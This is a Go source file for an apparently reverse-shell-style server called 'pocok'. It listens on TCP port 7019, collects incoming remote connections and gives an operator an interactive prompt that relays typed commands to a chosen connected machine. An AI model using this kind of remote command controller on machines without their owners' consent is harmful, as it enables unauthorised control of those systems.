package server

import (
  "net"
  "bufio"
  "strings"
  "log"
  "os"
  "fmt"
  "pocok/internal/server/rconn"
)

const (
	PORT = 7019        // 
  NO_CONNECTION = -1 //
)


type PocokServer struct {
  Conns []*rconn.RemoteConnection  // This is a array for all the avilable connections
  Curr  int                        // This is the index of the current connection
  RCIp  string                     // This will hold the current rc ip
}


func New() *PocokServer {
	log.Println("Initializing server...")
  return &PocokServer{
    Curr: NO_CONNECTION,
    RCIp: "",
  }
}


func (ps *PocokServer) Current() *rconn.RemoteConnection{
  return ps.Conns[ps.Curr]
}

func (ps *PocokServer) Listen() {
	listener, err := net.Listen("tcp", fmt.Sprintf(":%d", PORT))
	if err != nil {
		log.Fatal(err)
	}

  go ps.listen(listener)
}

func (ps *PocokServer) Shell() {

	scanner := bufio.NewScanner(os.Stdin)

  for {

    // TODO: Check if connection is still on

    // Print prompt
    prompt := fmt.Sprintf("%s>", ps.RCIp)
		fmt.Print(prompt)

    // Get input
		scanner.Scan()
		input := scanner.Text()

    if input == "" { continue; }

    args := strings.Split(input, " ")

    // Handle commands
    if ps.Curr == NO_CONNECTION {
      if action, ok := OfflineActions[ strings.ToLower(args[0]) ]; ok {
        action(ps,args[1:])
      }
    }else{

     command := strings.ToLower(args[0])

     if strings.HasPrefix(command, "exit") {
       Exit(ps,args)
       continue;
     }

     // Send input
     ps.Current().Send(input)

      // Decide how to recieve message
      if action, ok := OnlineActions[ command ]; ok {
        action(ps,args[1:])
      } else {
        ps.Current().Recieve()
      }

    }
    
  }

}
// -- private --

func (ps *PocokServer) listen(listener net.Listener) {
  for {
	  conn, err := listener.Accept()
	  if err != nil {
	  	log.Println("Error accepting connection: ", err.Error())
	  }
    fmt.Println("")
	  log.Println("Connection established with: ", conn.RemoteAddr().String())

    rc := rconn.New(conn)
    rc.Start()
    ps.Conns = append(ps.Conns, rc)
  }
}
